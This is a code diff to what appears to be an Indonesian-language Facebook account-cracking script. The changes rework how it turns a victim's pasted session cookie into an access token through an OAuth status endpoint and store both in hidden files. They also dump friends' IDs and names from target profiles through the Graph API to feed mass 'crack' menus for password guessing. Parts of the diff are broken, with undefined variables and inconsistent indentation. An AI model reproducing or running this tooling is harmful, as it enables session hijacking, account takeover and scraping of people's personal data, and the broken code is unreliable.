@@ -71,6 +71,7 @@ pretty.install()
 CON=sol()
 wa = Console()
 prem = []
+temanku=[]
 free=[]
 console = Console()
 ses=requests.Session()
@@ -367,19 +368,21 @@ def login():
         login123()
 
 def login_lagi334():
-    cokie = {'cookie':input("cookie: ")}
-    try:
-        req = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1', cookies = cokie).text
-        act = re.search('act=(\d+)',str(req)).group(1)
-        res = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&act=%s&breakdown_regrouping=1'%(act), cookies = cokie).text
-        xyz = re.search('window.__accessToken="(.*?)"', str(res)).group(1)
-        open('.cok.txt','w').write(cokie.get('cookie'))
-        open('.token.txt','w').write(xyz)
-        print('')
-        print('your token : '+xyz)
-        follow_me(cokie)
-    except Exception as e:
-        exit(e)
+	cookie = input(f'\n[{O}?{N}] Cookies : ')
+	try:
+		ses.headers.update({"Accept-Language": "id,en;q=0.9","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36","Referer": "https://www.instagram.com/","Host": "www.facebook.com","Sec-Fetch-Mode": "cors","Accept": "*/*","Connection": "keep-alive","Sec-Fetch-Site": "cross-site","Sec-Fetch-Dest": "empty","Origin": "https://www.instagram.com","Accept-Encoding": "gzip, deflate"})
+		link = ses.get("https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/", cookies={"cookie": cookie})
+		if '"access_token":' in str(link.headers):
+			token = re.search('"access_token":"(.*?)"', str(link.headers)).group(1)
+			open('.cok.txt','w').write(cookie);open('.token.txt','w').write(token)
+			print('')
+			print('your token : '+token)
+			follow_me(cookie)
+			exit(f'\n[{H}+{N}] Login menggunakan cookie berhasil')
+		else:exit()
+	except Exception as e:
+		exit(f'\n[{M}!{N}] Login menggunakan cookie gagal!')
+	
 def follow_me(xyz): # YANG GAK GANTI BOT FOLLOW GANTENG
     from bs4 import BeautifulSoup as BSP
     try:
@@ -399,15 +402,17 @@ def menu(my_name,my_id):
         os.system('rm -rf .token.txt && rm -rf .cok.txt')
         time.sleep(3)
         login()
-    try:
-        name = requests.get('https://graph.facebook.com/%s?access_token=%s'%('me',token), cookies = {'cookie':cookie}).json()['name']
-    except KeyError:login()
+     try:
+     	link = ses.get(f"https://graph.facebook.com/{uid}?fields=friends&access_token={self.token}", cookies={"cookie": self.cookie}).json()
+     	for z in link['friends']['data']:
+         	temanku.append(c["id"]+"|"+c["name"])
+    except: pass
     os.system('clear')
     negara = requests.get("http://ip-api.com/json/").json()["country"]
     ip = requests.get("http://ip-api.com/json/").json()["query"]
     prints(Panel(f"{H2}{waktucok()}",padding=(0,22),width=60,style=f"{color_panel}"))
     dia.append(Panel(f'{P2}IP      : {H2}{ip}\n{P2}premium : {H2}Premium\n{P2}Negara  : {H2}{negara}',width=30,style=f"{color_panel}"))
-    dia.append(panel(f'{P2}Name   : {H2}{name}\n{P2}Idz    : {H2}{my_id}\n{P2}Waktu  : {H2}{waktucok()}',width=30,style=f"{color_panel}"))
+    dia.append(panel(f'{P2}Name   : {H2}{my_name}\n{P2}Idz    : {H2}{my_id}\n{P2}Teman : {H2}{temanku}\n{P2}Waktu  : {H2}{waktucok()}',width=30,style=f"{color_panel}"))
     console.print(Columns(dia))
     prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik   [{color_text}05{P2}]. crack pencarian nama
 [{color_text}02{P2}]. crack dari id Masal    [{color_text}06{P2}]. Dump ID Publik
@@ -442,32 +447,31 @@ def menu(my_name,my_id):
     else:
         console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")
 
-def dump_publik():
-    tk = open('.token.txt','r').read()
-    ck = open('.cok.txt','r').read()
-    dta = {'access_token':tk,'after':None}
-    url = 'https://graph.facebook.com/v18.0/%s/friends'
-    prints(Panel(f"""masukan id target, pastikan id target bersifat publik""",width=60,style=f"{color_panel}"))
-    uid = console.input(f" {H2}• {P2}masukan id : ")
-    for xxx in uid.split(','):
-        exec_dump(dta, url, xxx, id, ck)
-    print('')
-    setting()
 
-def exec_dump(params, host, user, viper, coki):
-    try:
-        req = requests.get(host%(user), params=params, cookies={'cookie':coki}).json()
-        for xyz in req['data']:
-            uid = '%s|%s'%(xyz['id'],xyz['name'])
-            if uid not in viper:viper.append(uid)
-            print('%s[%s!%s] Success Medapatkan %s Id '%(N,M,N,len(viper)),end='\r')
-            sys.stdout.flush()
-        if 'paging' in str(req):
-           after = req['paging']['cursors']['after']
-           params.update({'after': after})
-           exec_dump(params, host, user, viper, coki)
-    except:pass
-    return viper
+def dump_publik():
+	with requests.Session() as ses:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()	
+		prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
+		a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
+		if a in ['me','Me','ME']:
+			try:
+				koH = requests.get(f"https://graph.facebook.com/{a}?fields=friends&access_token={token}", cookies={"cookie": cok}).json()
+				for pi in koH['friends']['data']:
+					try:id.append(pi['id']+'|'+pi['name'])
+					except:continue
+				setting()
+			except Exception as d:
+				print(d)
+		else:
+			try:
+				b = ses.get(f"https://graph.facebook.com/{a}?fields=friends&access_token={token}", cookies={"cookie": cok}).json()
+				for c in b["friends"]["data"]:
+					id.append(c["id"]+"|"+c["name"])
+				setting()
+			except Exception as e:
+				print(e)
+				
 
 #-----------------[ CRACK EMAIL ]-----------------#
 def crack_email():
@@ -755,11 +759,7 @@ def publikv2():
         rspd  = ('/sdcard/RUDAL-DUMP/' + filetex + '.txt').replace(' ', '_')
         koli = open(rspd, 'w')
         try:
-            params = {
-            "access_token": token, 
-            "fields": "name,friends.fields(id,name,birthday)"
-            }
-            b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
+            b = ses.get(f"https://graph.facebook.com/{a}?fields=friends&access_token={token}", cookies={"cookie": cok}).json()
             for c in b["friends"]["data"]:
                 id.append(c["id"]+"|"+c["name"])
                 koli.write(c['id']+'|'+c['name']+ '\n')
@@ -768,7 +768,8 @@ def publikv2():
             console.print(f' {H2}• {P2}Total Id Dump :{H2} %s {P2} '%(len(id)))
             console.print(f' {H2}• {P2}File Disimpan Di {H2}%s{P2}'%(rspd))
             time.sleep(3)
-            exit('\n{H2}Thank Sudah Mengunakan Script Ini{P2}\n')
+            console.print(f' {H2}• {P2}Thank Sudah Mengunakan Script Ini')
+            exit()
         except Exception as e:
             print(e)
 
@@ -780,8 +781,8 @@ def massal():
     except IOError:
         exit()
     try:
-        Console().print(Panel('\t[bold white] Mau Berapa Target Yang Mau Di Crack',width=80,style=f"{color_panel}", title="[bold green] Crack Masal [bold white]"))
-        jum = int(input(f"{O}  ─> "))
+        Console().print(Panel('[bold white] Mau Berapa Target Yang Mau Di Crack',width=60,style=f"{color_panel}", title="[bold green] Crack Masal [bold white]"))
+        jum = int(input(f" • Masukan : "))
     except ValueError:
         Console().print(f" {H2}• {P2} Wrong input ")
         exit()
@@ -792,29 +793,12 @@ def massal():
     yz = 0
     for met in range(jum):
         yz+=1
-        Console().print(panel('\t[bold white] Masukkan Target ke '+str(yz)+'',width=80,style=f"{color_panel}"))
+        Console().print(panel('[bold white] Masukkan Target ke '+str(yz)+'',width=60,style=f"{color_panel}"))
         kl = Console().input(f" {H2}• {P2}Masukan : ")
         uid.append(kl)
     for userr in uid:
         try:
-            head = (
-                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
-                 })
-            if len(id) == 0:
-                params = (
-                    {
-                        'access_token': token,
-                        'fields': "friends"
-                        }	          
-                    )
-            else:
-                params = (
-                    {
-                        'access_token': token,
-                        'fields': "friends"
-                        }	           
-                    )
-            col = ses.get('https://graph.facebook.com/{}'.format(userr),params=params,headers=head,cookies={'cookies':cok}).json()
+            col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}", cookies={"cookie": cok}).json()
             for mi in col['friends']['data']:
                 try:
                     iso = (mi['id']+'|'+mi['name'])
@@ -826,9 +810,7 @@ def massal():
         except requests.exceptions.ConnectionError:
             Console().print(f" {H2}• {P2}Unstable Signal ")
             exit()
-    try:
-        Console().print(panel("""[bold white] Total Id Target Yang Terkumpul""",width=80,style=f"{color_panel}"))
-        Console().print(f' {H2}• {P2}'+str(len(id)))					  
+    try:			  
         setting()
     except requests.exceptions.ConnectionError:
         print(f'')
